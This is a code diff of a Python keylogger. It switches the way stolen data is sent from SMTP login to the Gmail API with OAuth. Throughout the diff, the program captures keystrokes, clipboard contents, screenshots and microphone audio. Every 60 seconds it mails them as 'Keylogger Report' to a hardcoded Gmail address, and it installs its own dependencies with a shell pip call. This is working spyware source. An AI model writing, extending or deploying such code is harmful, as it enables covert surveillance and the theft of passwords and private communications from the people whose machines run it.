@@ -18,22 +18,41 @@ try:
     import glob
     import time
     import tempfile
+    from google.oauth2.credentials import Credentials
+    from google_auth_oauthlib.flow import InstalledAppFlow
+    from googleapiclient.discovery import build
 except ModuleNotFoundError:
     from subprocess import call
-    modules = ["pyscreenshot", "sounddevice", "pynput", "pyperclip"]
+    modules = ["pyscreenshot", "sounddevice", "pynput", "pyperclip", "google-auth", "google-auth-oauthlib", "google-auth-httplib2", "google-api-python-client"]
     call("pip install " + ' '.join(modules), shell=True)
 
 finally:
-    EMAIL_ADDRESS = "mobi.mail.tp@gmail.com"
-    EMAIL_PASSWORD = "123xxxxxx"
+    # Update the path to your OAuth 2.0 credentials JSON file
+    CREDENTIALS_FILE = 'path/to/your/credentials.json'
+    SCOPES = ['https://www.googleapis.com/auth/gmail.send']
+
+    def get_gmail_service():
+        creds = None
+        if os.path.exists('token.json'):
+            creds = Credentials.from_authorized_user_file('token.json', SCOPES)
+        if not creds or not creds.valid:
+            if creds and creds.expired and creds.refresh_token:
+                creds.refresh(Request())
+            else:
+                flow = InstalledAppFlow.from_client_secrets_file(CREDENTIALS_FILE, SCOPES)
+                creds = flow.run_local_server(port=0)
+            with open('token.json', 'w') as token:
+                token.write(creds.to_json())
+        service = build('gmail', 'v1', credentials=creds)
+        return service
+
     SEND_REPORT_EVERY = 60  # as in seconds
 
     class KeyLogger:
-        def __init__(self, time_interval, email, password):
+        def __init__(self, time_interval):
             self.interval = time_interval
             self.log = "KeyLogger Started..."
-            self.email = email
-            self.password = password
+            self.service = get_gmail_service()
 
         def appendlog(self, string):
             self.log += string
@@ -63,14 +82,14 @@ finally:
 
             self.appendlog(current_key + "\n")
 
-        def send_mail(self, email, password, message, attachment_path=None):
+        def send_mail(self, message, attachment_path=None):
             try:
-                msg = MIMEMultipart()
-                msg['From'] = email
-                msg['To'] = email
-                msg['Subject'] = "Keylogger Report"
+                message = MIMEMultipart()
+                message['to'] = 'mobi.mail.tp@gmail.com'
+                message['from'] = 'mobi.mail.tp@gmail.com'
+                message['subject'] = 'Keylogger Report'
 
-                msg.attach(MIMEText(message, 'plain'))
+                message.attach(MIMEText(self.log, 'plain'))
 
                 if attachment_path and os.path.exists(attachment_path):
                     with open(attachment_path, "rb") as attachment:
@@ -78,11 +97,11 @@ finally:
                         part.set_payload(attachment.read())
                         encoders.encode_base64(part)
                         part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
-                        msg.attach(part)
+                        message.attach(part)
 
-                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
-                    server.login(email, password)
-                    server.sendmail(email, email, msg.as_string())
+                raw_message = base64.urlsafe_b64encode(message.as_bytes()).decode()
+                message_body = {'raw': raw_message}
+                self.service.users().messages().send(userId='me', body=message_body).execute()
             except Exception as e:
                 logging.error(f"Failed to send email: {e}")
                 os._exit(1)
@@ -90,7 +109,7 @@ finally:
         def report(self):
             self.appendlog("\nClipboard content: " + self.get_clipboard_content() + "\n")
             screenshot_path = self.screenshot()
-            self.send_mail(self.email, self.password, "\n\n" + self.log, screenshot_path)
+            self.send_mail("\n\n" + self.log, screenshot_path)
             self.log = ""
             timer = threading.Timer(self.interval, self.report)
             timer.daemon = True
@@ -128,7 +147,7 @@ finally:
             sd.wait()
             obj.writeframesraw(myrecording)
 
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
+            self.send_mail(message=obj)
 
         def screenshot(self):
             try:
@@ -168,5 +187,5 @@ finally:
                 except OSError:
                     print('File is close.')
 
-    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
+    keylogger = KeyLogger(SEND_REPORT_EVERY)
     keylogger.run()
